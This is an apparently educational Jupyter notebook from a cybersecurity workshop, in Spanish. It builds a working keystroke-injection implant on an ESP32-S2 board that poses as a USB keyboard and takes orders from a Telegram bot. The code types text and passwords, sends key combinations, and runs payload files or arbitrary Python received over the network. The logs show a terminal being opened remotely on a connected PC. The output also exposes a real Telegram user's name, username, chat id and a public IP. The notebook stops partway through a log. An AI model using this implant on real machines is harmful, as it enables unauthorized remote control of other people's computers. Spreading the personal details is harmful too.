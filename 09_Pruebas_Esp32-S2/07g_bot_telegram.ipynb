{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2cac1251-ffe0-4b8c-93a1-662a433f02bb",
   "metadata": {},
   "source": [
    "### POC: \"USB-Harware Command And control\"\n",
    "- Taller: Hacking USB From Zero To Hero CFGS Ciberseguridad - STUCOM Barcelona 2024\n",
    "- https://www.stucom.com/es/\n",
    "\n",
    "<pre>\n",
    "En esta POC flasearemos y programaremos un Dispositivo Circuitpython\n",
    "Para que se presente como un dispositivo USB HID personalizado**\n",
    "y luego mediante un Bot de telegram controlaremos de forma centralizada\n",
    "todos los PCs conectados a estos dispositivos\n",
    "\n",
    "** modificaremos Fabricante, Producto, VID, PID y los distintos Endpoints a presentar\n",
    "   Teclado , Raton , Storage , CDC/Serie , Custom\n",
    "</pre>\n",
    "___\n",
    "\n",
    "<pre>\n",
    "CC Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)   \n",
    "https://creativecommons.org/licenses/by-sa/4.0/   \n",
    "https://euskalhack.org/   \n",
    "</pre>\n",
    "___\n",
    "<br>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "1b60125e-426c-448c-b305-a06aad11d446",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Welcome to Adafruit CircuitPython 9.0.3!\n",
      "\n",
      "Visit circuitpython.org for more information.\n",
      "\n",
      "To list built-in modules type `help(\"modules\")`.\n"
     ]
    }
   ],
   "source": [
    "help()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "baa198f1-cf5e-4094-abfd-c40f790ecf4e",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Conexion con el dispositivo via serie (linux ttyXXX, Windows ComXXX, Mac cu.usbmodem \n",
    "#kernel micropython (con kernel circuitpython no hace falta pero con algunas placas no va. tema VID)\n",
    "#%serialconnect --verbose --port=/dev/ttyACM2"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "774556bd-b749-43d3-be3c-b30012077848",
   "metadata": {},
   "source": [
    "```python\n",
    "#Nota: SI da ERROR aparecera una lista con los puertos disponibles. => PRUEBA-ERROR\n",
    "Connecting to --port=/dev/ttyACM1 --baud=115200 could not open port /dev/ttyACM1: \n",
    "[Errno 2] No such file or directory: '/dev/ttyACM1'\n",
    "\n",
    "Try one of these ports as --port= \n",
    "  /dev/ttyACM0\n",
    "  /dev/ttyACM2\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "11cc005b-bcf4-4fd2-84ea-f5c1f993d3f6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "object <Runtime> is of type Runtime\n",
      "  usb_connected -- <property>\n",
      "  serial_connected -- <property>\n",
      "  serial_bytes_available -- <property>\n",
      "  run_reason -- <property>\n",
      "  safe_mode_reason -- <property>\n",
      "  autoreload -- <property>\n",
      "  ble_workflow -- <property>\n",
      "  rgb_status_brightness -- <property>\n",
      "496.98\n",
      "supervisor.RunReason.REPL_RELOAD\n"
     ]
    }
   ],
   "source": [
    "import supervisor \n",
    "help(supervisor.runtime)\n",
    "print(supervisor.ticks_ms()/1024)\n",
    "print(supervisor.runtime.run_reason)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "aae744b2-9672-4bf3-94d0-634aee9b54ac",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "object <module 'microcontroller'> is of type module\n",
      "  __name__ -- microcontroller\n",
      "  cpu -- <Processor>\n",
      "  delay_us -- <function>\n",
      "  disable_interrupts -- <function>\n",
      "  enable_interrupts -- <function>\n",
      "  on_next_reset -- <function>\n",
      "  reset -- <function>\n",
      "  nvm -- <ByteArray>\n",
      "  watchdog -- <WatchDogTimer>\n",
      "  ResetReason -- <class 'ResetReason'>\n",
      "  RunMode -- <class 'RunMode'>\n",
      "  Pin -- <class 'Pin'>\n",
      "  pin -- <module ''>\n",
      "  Processor -- <class 'Processor'>\n"
     ]
    }
   ],
   "source": [
    "import microcontroller\n",
    "help(microcontroller)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "3162ae26-4b1e-4671-8be5-36b7078f1114",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "object <module 'sys'> is of type module\n",
      "  __name__ -- sys\n",
      "  argv -- []\n",
      "  version -- 3.4.0; CircuitPython 9.0.3 on 2024-04-04\n",
      "  version_info -- (3, 4, 0)\n",
      "  implementation -- (name='circuitpython', version=(9, 0, 3), _machine='S2Mini with ESP32S2-S2FN4R2', _mpy=262)\n",
      "  platform -- Espressif\n",
      "  byteorder -- little\n",
      "  maxsize -- 2147483647\n",
      "  exit -- <function>\n",
      "  stdin -- <io.FileIO 0>\n",
      "  stdout -- <io.FileIO 1>\n",
      "  stderr -- <io.FileIO 2>\n",
      "  modules -- {}\n",
      "  print_exception -- <function>\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "help(sys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "20d976f3-d659-4b20-a41e-c31bc9fd9feb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "S2Mini with ESP32S2-S2FN4R2 9.0.3 on 2024-04-04 ESP32S2-S2FN4R2\n",
      "Espressif 3.4.0; CircuitPython 9.0.3 on 2024-04-04 (name='circuitpython', version=(9, 0, 3), _machine='S2Mini with ESP32S2-S2FN4R2', _mpy=262)\n"
     ]
    }
   ],
   "source": [
    "#Informacion de la placa , chip y version Python\n",
    "import os ,sys  #help(os.uname())\n",
    "print(os.uname().machine, os.uname().version, os.uname().sysname) \n",
    "print(sys.platform, sys.version, sys.implementation) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d59970ad-1402-44af-8a45-a0f7c3ce80ed",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USB True\n"
     ]
    }
   ],
   "source": [
    "#Averiguo estado del USB:puede ser interesante en los reinicios para entrar en la BIOS\n",
    "#https://github.com/todbot/circuitpython-tricks\n",
    "#import supervisor #help(supervisor.runtime)\n",
    "#print(\"USB\",supervisor.runtime.usb_connected,\"CDC\",supervisor.runtime.serial_connected)\n",
    "import supervisor;print(\"USB\",supervisor.runtime.usb_connected)\n",
    "#idea poner esto en el bucle "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "08446f1e-5f2a-48b6-a5f5-01e888e9be96",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "frec: 240000000 Temp: 32.3\n",
      "microcontroller.ResetReason.POWER_ON\n"
     ]
    }
   ],
   "source": [
    "import microcontroller\n",
    "print(\"frec:\",microcontroller.cpu.frequency , \"Temp:\", microcontroller.cpu.temperature)\n",
    "print( microcontroller.cpu.reset_reason)\n",
    "#Deberia diferenciar POWER_ON de SOFTWARE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "b823cfc0-3399-4215-9ff3-9aae349088e0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "object <class 'RunMode'> is of type type\n",
      "  UF2 -- microcontroller.RunMode.UF2\n",
      "  NORMAL -- microcontroller.RunMode.NORMAL\n",
      "  SAFE_MODE -- microcontroller.RunMode.SAFE_MODE\n",
      "  BOOTLOADER -- microcontroller.RunMode.BOOTLOADER\n",
      "<class 'RunMode'>\n"
     ]
    }
   ],
   "source": [
    "help(microcontroller.RunMode)\n",
    "print(microcontroller.RunMode)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "eb40203b-644d-45c8-933b-ca1f63f51f28",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Conectando wifi None\n"
     ]
    }
   ],
   "source": [
    "# Conexion WIFI (si has configurado settings.toml no hace falta)\n",
    "# Pero para ahorrar memoria lo hago \"a mano\" asi no se carga el WEBRPL\n",
    "import wifi\n",
    "if not  wifi.radio.connected:\n",
    "    print(\"Conectando wifi\",wifi.radio.connect(os.getenv(\"SSID\"),os.getenv(\"WPWD\")))\n",
    "else:\n",
    "    print(\"Wifi ok\", wifi.radio.ipv4_address)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "6b338124-7642-4756-b350-779250237dd8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HOST:\t LS2Mini\n",
      "IP:\t 192.168.43.240\n",
      "GW:\t 192.168.43.1 0.012\n",
      "DNS:\t 192.168.43.1\n"
     ]
    }
   ],
   "source": [
    "# Compruebo Estado wifi\n",
    "import wifi\n",
    "if wifi.radio.connected:\n",
    "    print(\"HOST:\\t\", wifi.radio.hostname)\n",
    "    print(\"IP:\\t\", wifi.radio.ipv4_address)\n",
    "    print(\"GW:\\t\", wifi.radio.ipv4_gateway,wifi.radio.ping(wifi.radio.ipv4_gateway))\n",
    "    print(\"DNS:\\t\", wifi.radio.ipv4_dns)\n",
    "else:\n",
    "    print(\"sin Conexion\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "e8a80476-016e-42ef-b277-67e205d6eec8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "depuracion: 200 \n",
      "\n",
      " {'server': 'gunicorn/19.9.0', 'content-type': 'application/json', 'date': 'Mon, 15 Apr 2024 21:44:27 GMT', 'connection': 'keep-alive', 'access-control-allow-credentials': 'true', 'content-length': '242', 'access-control-allow-origin': '*'} \n",
      "\n",
      " {\n",
      "  \"args\": {}, \n",
      "  \"headers\": {\n",
      "    \"Host\": \"httpbin.org\", \n",
      "    \"User-Agent\": \"Adafruit CircuitPython\", \n",
      "    \"X-Amzn-Trace-Id\": \"Root=1-661d9fbb-4b1a78411d4833ac2c7a2184\"\n",
      "  }, \n",
      "  \"origin\": \"31.4.135.126\", \n",
      "  \"url\": \"http://httpbin.org/get\"\n",
      "}\n",
      "\n",
      "Ip Publica: 31.4.135.126\n"
     ]
    }
   ],
   "source": [
    "#Pruebas request get y json (obtengo ip publica)\n",
    "import socketpool, ssl, adafruit_requests, json\n",
    "if 'pool' not in locals():      #si pool      no existe lo creo\n",
    "    pool = socketpool.SocketPool(wifi.radio)\n",
    "if 'urequests' not in locals(): #si urequests no existe lo creo\n",
    "    urequests = adafruit_requests.Session(pool, ssl.create_default_context())\n",
    "\n",
    "resp = urequests.get(\"http://httpbin.org/get\")  #help(resp)\n",
    "print(\"\\ndepuracion:\",resp.status_code,\"\\n\\n\",resp.headers,\"\\n\\n\",resp.text)#depuracion\n",
    "\n",
    "mi_json = json.loads((resp.text))#paso respuesta a json\n",
    "print(\"Ip Publica:\",mi_json['origin'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "0faeaebd-2690-4130-9ead-37042ebdfcce",
   "metadata": {},
   "outputs": [],
   "source": [
    "# teclado: simula un teclado. Envia pulsaciones que se le pasan como parametro\n",
    "import usb_hid\n",
    "from adafruit_hid.keyboard import Keyboard \n",
    "from adafruit_hid.keycode  import Keycode   #help(Keycode)\n",
    "from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\n",
    "#https://circuitpython.org/libraries\n",
    "\n",
    "kbd = Keyboard(usb_hid.devices) #help(kbd)\n",
    "layout = KeyboardLayoutUS(kbd) #help(layout)\n",
    "\n",
    "def teclado(*args):\n",
    "    try:\n",
    "        if len(args) > 2 :   # Combinacion tres teclas a la vez\n",
    "            kbd.send(args[0], args[1], args[2]);\n",
    "        elif len(args) == 2 :# Combinacion dos teclas a la vez\n",
    "            kbd.send(args[0], args[1])\n",
    "        elif isinstance(args[0], int):\n",
    "            kbd.send(args[0])# Una tecla especial. (ej ENTER)\n",
    "        elif isinstance(args[0], str):\n",
    "            layout.write(args[0])\n",
    "    except Exception as err:\n",
    "        print('Error',err)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "e2045a8a-f71f-4cc0-86a1-535ba02046e4",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "object <class 'Keycode'> is of type type\n",
      "  F23 -- 114\n",
      "  F24 -- 115\n",
      "  KEYPAD_FIVE -- 93\n",
      "  KEYPAD_NUMLOCK -- 83\n",
      "  FOUR -- 33\n",
      "  SEVEN -- 36\n",
      "  KEYPAD_ENTER -- 88\n",
      "  BACKSLASH -- 49\n",
      "  RETURN -- 40\n",
      "  CAPS_LOCK -- 57\n",
      "  KEYPAD_THREE -- 91\n",
      "  TAB -- 43\n",
      "  WINDOWS -- 227\n",
      "  KEYPAD_NINE -- 97\n",
      "  RIGHT_SHIFT -- 229\n",
      "  KEYPAD_PERIOD -- 99\n",
      "  LEFT_ARROW -- 80\n",
      "  KEYPAD_ZERO -- 98\n",
      "  RIGHT_GUI -- 231\n",
      "  DELETE -- 76\n",
      "  ESCAPE -- 41\n",
      "  POUND -- 50\n",
      "  OPTION -- 226\n",
      "  ZERO -- 39\n",
      "  GUI -- 227\n",
      "  NINE -- 38\n",
      "  COMMAND -- 227\n",
      "  THREE -- 32\n",
      "  MINUS -- 45\n",
      "  END -- 77\n",
      "  INSERT -- 73\n",
      "  KEYPAD_SEVEN -- 95\n",
      "  KEYPAD_ASTERISK -- 85\n",
      "  FIVE -- 34\n",
      "  KEYPAD_FORWARD_SLASH -- 84\n",
      "  PAGE_DOWN -- 78\n",
      "  KEYPAD_FOUR -- 92\n",
      "  E -- 8\n",
      "  KEYPAD_SIX -- 94\n",
      "  CONTROL -- 224\n",
      "  D -- 7\n",
      "  G -- 10\n",
      "  SHIFT -- 225\n",
      "  F -- 9\n",
      "  A -- 4\n",
      "  M -- 16\n",
      "  SPACE -- 44\n",
      "  KEYPAD_PLUS -- 87\n",
      "  N -- 17\n",
      "  C -- 6\n",
      "  B -- 5\n",
      "  COMMA -- 54\n",
      "  L -- 15\n",
      "  TWO -- 31\n",
      "  T -- 23\n",
      "  W -- 26\n",
      "  V -- 25\n",
      "  Q -- 20\n",
      "  P -- 19\n",
      "  S -- 22\n",
      "  PAUSE -- 72\n",
      "  R -- 21\n",
      "  RIGHT_BRACKET -- 48\n",
      "  SEMICOLON -- 51\n",
      "  DOWN_ARROW -- 81\n",
      "  Y -- 28\n",
      "  X -- 27\n",
      "  KEYPAD_BACKSLASH -- 100\n",
      "  Z -- 29\n",
      "  __module__ -- adafruit_hid.keycode\n",
      "  POWER -- 102\n",
      "  ENTER -- 40\n",
      "  PAGE_UP -- 75\n",
      "  SPACEBAR -- 44\n",
      "  LEFT_ALT -- 226\n",
      "  KEYPAD_MINUS -- 86\n",
      "  SCROLL_LOCK -- 71\n",
      "  LEFT_SHIFT -- 225\n",
      "  PERIOD -- 55\n",
      "  O -- 18\n",
      "  LEFT_BRACKET -- 47\n",
      "  I -- 12\n",
      "  LEFT_CONTROL -- 224\n",
      "  PRINT_SCREEN -- 70\n",
      "  H -- 11\n",
      "  K -- 14\n",
      "  HOME -- 74\n",
      "  __qualname__ -- Keycode\n",
      "  J -- 13\n",
      "  U -- 24\n",
      "  RIGHT_CONTROL -- 228\n",
      "  KEYPAD_EIGHT -- 96\n",
      "  F3 -- 60\n",
      "  F2 -- 59\n",
      "  F1 -- 58\n",
      "  RIGHT_ALT -- 230\n",
      "  KEYPAD_TWO -- 90\n",
      "  F7 -- 64\n",
      "  F6 -- 63\n",
      "  F5 -- 62\n",
      "  F4 -- 61\n",
      "  modifier_bit -- <classmethod>\n",
      "  F9 -- 66\n",
      "  F8 -- 65\n",
      "  ALT -- 226\n",
      "  APPLICATION -- 101\n",
      "  F12 -- 69\n",
      "  F13 -- 104\n",
      "  F10 -- 67\n",
      "  F11 -- 68\n",
      "  RIGHT_ARROW -- 79\n",
      "  F16 -- 107\n",
      "  F14 -- 105\n",
      "  SIX -- 35\n",
      "  KEYPAD_EQUALS -- 103\n",
      "  F15 -- 106\n",
      "  BACKSPACE -- 42\n",
      "  F17 -- 108\n",
      "  F18 -- 109\n",
      "  F19 -- 110\n",
      "  EIGHT -- 37\n",
      "  EQUALS -- 46\n",
      "  LEFT_GUI -- 227\n",
      "  KEYPAD_ONE -- 89\n",
      "  QUOTE -- 52\n",
      "  F21 -- 112\n",
      "  ONE -- 30\n",
      "  F20 -- 111\n",
      "  GRAVE_ACCENT -- 53\n",
      "  FORWARD_SLASH -- 56\n",
      "  F22 -- 113\n",
      "  UP_ARROW -- 82\n"
     ]
    }
   ],
   "source": [
    "#https://usb.org/sites/default/files/hut1_21.pdf Pag 117 power\n",
    "#Los codigos de teclado en la pagina 82\n",
    "help(Keycode)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "47f74b90-676a-4d4b-b315-9c7680318695",
   "metadata": {},
   "source": [
    "```python\n",
    "# Ejemplos (usa: help(Keycode) para ver las definiciones de las teclas )\n",
    "#\n",
    "teclado(Keycode.CONTROL, Keycode.LEFT_ALT, Keycode.DELETE) \n",
    "teclado(Keycode.CONTROL, Keycode.LEFT_ALT, Keycode.A) \n",
    "teclado(Keycode.SHIFT, Keycode.A) #Envio una combinacion de teclas\n",
    "teclado(Keycode.CONTROL) \n",
    "teclado(Keycode.LEFT_ALT)\n",
    "teclado(Keycode.B)                #Envio una pulsacion de teeclado\n",
    "teclado(\"notepad\")                #Escribo un texto\n",
    "\n",
    "# Comprobacion: \n",
    "# en una terminal ejecuto usbhid-dump -e stream (deberia poder ver las pulsaciones)\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "97cd4422-8d6e-4dae-857e-8570f7cada56",
   "metadata": {
    "editable": true,
    "slideshow": {
     "slide_type": ""
    },
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Bot Telegram recibe el ultimo mensaje de un canal (solo una vez/last_update_id)\n",
    "import socketpool, ssl, adafruit_requests, json\n",
    "if 'pool' not in locals():      #si pool      no existe lo creo\n",
    "    pool = socketpool.SocketPool(wifi.radio)\n",
    "if 'urequests' not in locals(): #si urequests no existe lo creo\n",
    "    urequests = adafruit_requests.Session(pool, ssl.create_default_context())\n",
    "# A diferencia de micropyton en circuitpython tengo un numero limitado de sockets/pool\n",
    "if 'last_update_id' not in locals() or last_update_id is None:\n",
    "    last_update_id = 0 #Inicializo la variable asi\n",
    "\n",
    "tk =os.getenv(\"bot_tk\")# #bot+token del bot (ver BotFather)\n",
    "url=\"https://api.telegram.org/\"+tk+\"/getUpdates?offset=-1\"\n",
    "\n",
    "def telegram_bot_recibir_msg():#version solo usuario (no canales)\n",
    "  global urequests,mi_json,msg,tk,update_id,last_update_id,cid\n",
    "  try: #bot EuskalHack-EE29\n",
    "      req = urequests.get(url) #help(req)\n",
    "      mi_json = req.json()#json.loads((req.text))\n",
    "      #print(mi_json)#depuracion\n",
    "      req.close()\n",
    "      \n",
    "      if mi_json['result'] and mi_json['result'][0]['message']:\n",
    "          update_id = mi_json['result'][0]['update_id']           #num id del mensaje\n",
    "          msg = mi_json['result'][0]['message']['text']           #texto mensaje\n",
    "          cid = str(mi_json['result'][0]['message']['chat']['id'])#chat id mensaje\n",
    "          #print(\"\\ntelegram_bot:\",msg,\"\\n\")#depuracion\n",
    "          \n",
    "          #solo retorno una vez cada mensaje.(asi no repito mensajes ya procesados)\n",
    "          if  last_update_id != update_id:\n",
    "              last_update_id = update_id\n",
    "              return msg\n",
    "          \n",
    "      else:\n",
    "          print(\"telegram_bot: Sin mensaje\")\n",
    "      \n",
    "  except Exception as err:\n",
    "      print('Error',err)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa38ab98-44c0-42e4-8876-2b46bd8d768d",
   "metadata": {},
   "source": [
    "```python\n",
    "# Depuracion / pruebas Bot Telegram\n",
    "last_update_id = 0 #para volver a procesar el ultimo mensaje\n",
    "msg=telegram_bot_recibir_msg()    \n",
    "print(cid,msg,\"\\n\\n\",mi_json) #debug   \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "33c29d0f-9e1c-4ae1-bc7b-76af56c34d92",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "249163929 Hola \n",
      "\n",
      " {'result': [{'update_id': 614939454, 'message': {'message_id': 624, 'from': {'language_code': 'en', 'is_bot': False, 'last_name': 'Blazquez Lopez', 'first_name': 'Sergio', 'id': 249163929, 'username': 'Jejo_Em50L'}, 'text': 'Hola', 'chat': {'last_name': 'Blazquez Lopez', 'first_name': 'Sergio', 'username': 'Jejo_Em50L', 'id': 249163929, 'type': 'private'}, 'date': 1713132334}}], 'ok': True}\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# Depuracion / pruebas Bot Telegram\n",
    "last_update_id = 0 #para volver a procesar el ultimo mensaje\n",
    "msg=telegram_bot_recibir_msg()    \n",
    "print(cid,msg,\"\\n\\n\",mi_json) #debug   \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "ef5351d2-8b77-4cb5-b7c4-351d52d55026",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Bot Telegram envia un texto via telegram apibot por GET request\n",
    "# Nota: si enviamos primero un mensaje al bot este almacenara nuestro chat_id/cid\n",
    "def telegram_bot_send_txt(txt):#idea pasar cid como parametro si no inicializarlo\n",
    "    global urequests,mi_json,msg,tk,update_id,last_update_id,cid\n",
    "    if 'cid' not in locals(): cid=\"-1001535567580\"#-4155458875\" # numero de chat/canal/usuario por defecto\n",
    "    try:\n",
    "        print(\"Envio telegram:\",txt,\" \",end='')\n",
    "        txt=txt.replace(' ','+') #reemplazo espacios por + (un urlencode \"sencillo)\n",
    "        url=\"https://api.telegram.org/\"+tk+\"/sendMessage?chat_id=\"+str(cid)+\"&text=\"+txt\n",
    "        r = urequests.get(url)\n",
    "        print(r.content.decode()[1:10])  #depuracion muestro respuesta de la api\n",
    "        r.close()\n",
    "    except Exception as err:\n",
    "        print('Error',err)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "46b4a0b3-00c2-410c-9010-c3f834c6e4a6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Envio telegram: LS2Mini94 192.168.43.240  \"ok\":true\n"
     ]
    }
   ],
   "source": [
    "# Depuracion/pruebas: Envio nombre por telegram al iniciar la placa (añado mac para diferenciar placas)\n",
    "if wifi.radio.connected: \n",
    "    telegram_bot_send_txt(wifi.radio.hostname+str(wifi.radio.mac_address[-1])+\" \"+str(wifi.radio.ipv4_address))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "d9970e66-f785-4c0f-b4f9-97bea1587ae1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Proceso/ejecuto los comandos recibidos por el bot de telegram\n",
    "def procesa_telegram():\n",
    "    try:\n",
    "        msg=telegram_bot_recibir_msg()\n",
    "        print(\"\\nprocesa_telegram:\",msg,end='')#depuracion\n",
    "        \n",
    "        if not msg: return\n",
    "        \n",
    "        if msg[:4] == '/txt': #envia un texto\n",
    "            print(\" txt:\",msg[4:]) #ej /txt notepad\n",
    "            teclado(msg[4:])\n",
    "        \n",
    "        elif msg[:4] == '/unl': #desbloquea\n",
    "            print(\" unlock\")\n",
    "            teclado(Keycode.CONTROL, Keycode.LEFT_ALT, Keycode.A)\n",
    "            teclado(msg[4:])\n",
    "            teclado(Keycode.RETURN)\n",
    "              \n",
    "        elif msg[:4] == '/pld': #ejecuta un payload en un archivo .py\n",
    "            print(\" payload:\",msg[4:]) #ej /pld payload1.py\n",
    "            with open(msg[4:],'r') as file: \n",
    "                exec(file.read())\n",
    "\n",
    "        elif msg[:4] == '/rst': #Resetea dispositivo a Safe(ultimo digito mac)\n",
    "            if int(msg[4:]) == wifi.radio.mac_address[-1]:\n",
    "                telegram_bot_send_txt(\"Reset\"+msg[4:]);time.sleep(15)\n",
    "                import microcontroller\n",
    "                microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)\n",
    "                microcontroller.reset()\n",
    "\n",
    "        elif msg[:4] == '/key': #Combinacion tecla/s\n",
    "            print(\" key:\",msg[4:]) #ej /pld payload1.py\n",
    "            keys = msg[4:].split()\n",
    "            \n",
    "            if keys[0].isdigit(): # Codigo numerico que no esta en la Lista\n",
    "                teclado(int(keys[0])) \n",
    "            elif len(keys) == 1 : # tecla especial (ej ENTER WINDOWS CONTROL SHIFT ALT POWER )\n",
    "                teclado(getattr(Keycode,keys[0])) #help(Keycode)\n",
    "            elif len(keys) == 2 : # Combinacion 2 teclas a la vez\n",
    "                teclado(getattr(Keycode,keys[0]), getattr(Keycode,keys[1]))\n",
    "            elif len(keys) >  2 : # Combinacion tres teclas a la vez\n",
    "                teclado(getattr(Keycode,keys[0]), getattr(Keycode,keys[1]), getattr(Keycode,keys[2]))\n",
    "\n",
    "        elif msg[:4] == '/exe': #ejecuta codigo python !!!Danger!!!\n",
    "            exec(msg[5:]) #5 puto espacio\n",
    "            \n",
    "        else:\n",
    "            msg =\" Error: comando no existe: /txt /unl /pld /key /rst /exe\"\n",
    "            print(msg)\n",
    "        \n",
    "        #confirmo comando procesado: enviando un telegram con la respuesta\n",
    "        telegram_bot_send_txt(wifi.radio.hostname+str(wifi.radio.mac_address[-1])+\" \"+msg)\n",
    "        \n",
    "    except Exception as err:\n",
    "        print('Error',err)        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "6025df2a-8b0f-4947-9d64-e707760abe61",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "procesa_telegram: Hola Error: comando no existe: /txt /unl /pld /key /rst /exe\n",
      "Envio telegram: LS2Mini94  Error: comando no existe: /txt /unl /pld /key /rst /exe  \"ok\":true\n"
     ]
    }
   ],
   "source": [
    "# Depuracion / pruebas procesa_telegram()\n",
    "last_update_id = 0 #para volver a procesar el ultimo mensaje aunque ya se haya procesado\n",
    "procesa_telegram()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "f16db5c2-84d7-4666-98b9-f56e707fc23c",
   "metadata": {},
   "outputs": [],
   "source": [
    "#print(msg[5:])\n",
    "#exec(str(msg[5:]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "0b981abe-ede1-476e-a0ae-f27b6ee21052",
   "metadata": {},
   "outputs": [],
   "source": [
    "#bytes_cadena = msg[4:].encode()\n",
    "#print(bytes_cadena)\n",
    "#print(list(bytes_cadena))  # Esto mostrará los bytes de la cadena\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "d6281bde-8240-4ce4-bb0b-fbd942d43fc3",
   "metadata": {},
   "outputs": [],
   "source": [
    "#a=\"print('hola')\"\n",
    "#exec(a)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e6dbc0c-7505-44bf-8514-e2303a3caa59",
   "metadata": {},
   "source": [
    "```bash\n",
    "## Comprobacion de que se ha enviado la tecla indicada\n",
    "##teclado(Keycode.WINDOWS) #compruebo si sale elmismo esultado\n",
    "##en una terminal ejecuto usbhid-dump -e stream (deberia poder ver las pulsaciones)\n",
    "> usbhid-dump -e stream\n",
    "Starting dumping interrupt transfer stream\n",
    "with 1 minute timeout.\n",
    "\n",
    "001:026:002:STREAM  01 08 00 00 00 00 00 00 00\n",
    "001:026:002:STREAM  01 00 00 00 00 00 00 00 00\n",
    "\n",
    "#esto es lo que recogeria del teclado con el comando: /key WINDOWS\n",
    "#la primera linea es el codigo HID correspondiente a pulsar la tecla WINDOWS\n",
    "#la segunta linea es el codigo HID correspondiente a soltar la tecla WINDOWS\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "08d4b57f-b652-45a6-9b89-83cbba9f4d8a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "telegram_bot: Sin mensaje\n",
      "\n",
      "procesa_telegram: Nonetelegram_bot: Sin mensaje\n",
      "\n",
      "procesa_telegram: Nonetelegram_bot: Sin mensaje\n",
      "\n",
      "procesa_telegram: Nonetelegram_bot: Sin mensaje\n",
      "\n",
      "procesa_telegram: Nonetelegram_bot: Sin mensaje\n",
      "\n",
      "procesa_telegram: None\n",
      "procesa_telegram: /key ALT F2 key:  ALT F2\n",
      "Envio telegram: LS2Mini94 /key ALT F2  \"ok\":true\n",
      "\n",
      "procesa_telegram: None\n",
      "procesa_telegram: /txt lxterminal txt:  lxterminal\n",
      "Envio telegram: LS2Mini94 /txt lxterminal  \"ok\":true\n",
      "\n",
      "procesa_telegram: None\n",
      "procesa_telegram: /key ENTER key:  ENTER\n",
      "Envio telegram: LS2Mini94 /key ENTER  \"ok\":true\n",
      "\n",
      "procesa_telegram: /txt dmesg txt:  dmesg\n",
      "Envio telegram: LS2Mini94 /txt dmesg  \"ok\":true\n",
      "\n",
      "procesa_telegram: /key ENTER key:  ENTER\n",
      "Envio telegram: LS2Mini94 /key ENTER  \"ok\":true\n",
      "\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
      "procesa_telegram: None\n",
